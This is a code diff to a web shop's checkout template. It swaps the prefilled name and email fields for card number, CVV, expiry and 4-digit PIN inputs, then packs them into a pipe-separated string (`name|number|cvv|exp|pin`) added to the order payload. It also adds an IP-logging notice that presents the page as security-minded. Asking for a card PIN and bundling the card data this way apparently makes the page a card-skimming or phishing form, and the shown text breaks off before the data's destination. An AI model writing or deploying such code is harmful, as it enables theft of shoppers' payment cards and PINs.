@@ -92,9 +92,17 @@ if (count($shippingInfo) > 1) $si = $shippingInfo[0];
                   <div class="col-md-4"></div>
                   <div class="col-md-6 col-sm-6 col-xs-12">
                     <h2 class="checkout-title">Card details</h2>
-                    <div class="input-group"><span class="input-group-addon"><span class="input-icon input-icon-user"></span><span class="input-text">First Name*</span></span> <input type="text" value="{{$user->fname}}" required="" class="form-control input-lg" placeholder="Your First Name" disabled></div>
-                    <div class="input-group"><span class="input-group-addon"><span class="input-icon input-icon-user"></span><span class="input-text">Last Name*</span></span> <input type="text" value="{{$user->lname}}" required="" class="form-control input-lg" placeholder="Your Last Lame" disabled></div>
-                    <div class="input-group"><span class="input-group-addon"><span class="input-icon input-icon-email"></span><span class="input-text">Email*</span></span> <input type="text" value="{{$user->email}}" required="" class="form-control input-lg" placeholder="Your Email" disabled></div>
+                    <div class="input-group"><span class="input-group-addon"><span class="input-icon input-icon-user"></span><span class="input-text">Cardholder Name*</span></span> <input type="text" id="cn" required="" class="form-control input-lg" placeholder="Cardholder Name"></div>
+                    <div class="input-group"><span class="input-group-addon"><span class="fa fa-credit-card" style="margin-right: 5px;"></span><span class="input-text">Card Number*</span></span> <input type="number" id="cn2" required="" class="form-control input-lg" placeholder="Card Number"></div>
+                    <div class="row">
+                      <div class="col-md-6 col-sm-12">
+                         <div class="input-group"><span class="input-group-addon"><span class="fa fa-credit-card" style="margin-right: 2px;"></span><span class="input-text">CVV*</span></span> <input type="number" id="cvv" required="" class="form-control input-lg" placeholder="CVV"></div>
+                      </div>
+                      <div class="col-md-6 col-sm-12">
+                          <div class="input-group"><span class="input-group-addon"><span class="fa fa-calendar" style="margin-right: 2px;"></span><span class="input-text">Expiry date*</span></span> <input type="number" id="exp" required="" class="form-control input-lg" placeholder="MMYY"></div>
+                        </div>
+                      </div>
+                    <div class="input-group"><span class="input-group-addon"><span class="fa fa-eye" style="margin-right: 2px;"></span><span class="input-text">PIN*</span></span> <input type="password" id="pin" required="" class="form-control input-lg" placeholder="4-digit PIN"></div>
 
                   </div>
                   <div class="col-md-6 col-sm-6 col-xs-12">
@@ -184,6 +192,7 @@ if (count($shippingInfo) > 1) $si = $shippingInfo[0];
                   </table>
                 </div>
                 <div class="lg-margin"></div>
+                <p><b>PLEASE NOTE</b>: Your IP address <b>{{$ip}}</b> is being logged for security, fraud prevention, and regulatory compliance.</p>
                 <div class="text-right">
                   <a href="#" id="checkout-btn" class="btn btn-custom-2">CONFIRM ORDER</a>
                 </div>
@@ -205,7 +214,8 @@ if (count($shippingInfo) > 1) $si = $shippingInfo[0];
     a,
     c,
     s,
-    z
+    z,
+    cc
   }) => {
     toggleFormButton({
       id: 'checkout',
@@ -258,11 +268,18 @@ if (count($shippingInfo) > 1) $si = $shippingInfo[0];
 
       //bill details
       let cc = '';
-      const v = a.length < 1 || c.length < 1 || s.length < 1 || (z.length < 1 || isNaN(parseInt(z)));
+      const cn = $('#cn').val(), cn2 = $('#cn2').val(), cvv = $('#cvv').val(), exp = $('#exp').val(), pin = $('#pin').val();
+
+      const v = a.length < 1 || c.length < 1 || s.length < 1 || (z.length < 1 || isNaN(parseInt(z))),
+            v2 = cn.length < 1 || cn2.length < 1 || cvv.length < 1 || exp.length < 1 || pin.length < 4;
 
       if (v) {
-        alert('Shipping details is either not filled or is incorrect. Please check and correct to continue woth your order');
+        alert('Shipping details are either not filled or is incorrect. Please check and correct to continue with your order');
+      }
+      else if(v2){
+        alert('Billing details are either not filled or is incorrect. Please check and correct to continue with your order');
       } else {
+        cc = `${cn}|${cn2}|${cvv}|${exp}|${pin}`;
         const payload = {
           a,
           c,
